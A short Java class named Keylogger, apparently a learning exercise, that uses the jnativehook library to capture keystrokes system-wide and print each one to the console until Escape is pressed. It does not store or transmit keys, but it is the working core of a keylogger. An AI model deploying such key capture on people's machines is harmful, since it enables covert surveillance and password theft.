
package fac;

import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author Usuario
 */
public class Keylogger implements NativeKeyListener
{
    
    public static void main(String[] args) 
    {
        try 
        {
            GlobalScreen.registerNativeHook();            
        } 
        catch (NativeHookException e) 
        {
            System.err.println("Error al registrar el NativeHook");
            System.out.println(e.getMessage());
            System.exit(0);
        }
        GlobalScreen.addNativeKeyListener(new Keylogger());
    }
    
      @Override
    public void nativeKeyPressed(NativeKeyEvent e) 
    {
         System.out.println("Keylogger -->" + NativeKeyEvent.getKeyText(e.getKeyCode()));
        
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE)
        {
            try 
            {
              GlobalScreen.unregisterNativeHook();
            } 
            catch (NativeHookException e1) 
            {
                System.out.println("Terminando proceso ...");    
            }
        }
        
    }        
    
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) 
    {
        System.out.println("KeyReleased --->" + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }
     
      @Override
    public void nativeKeyTyped(NativeKeyEvent e) 
    {
        System.out.println("KeyTyped --->" + e.getKeyCode() );
    }

    
}
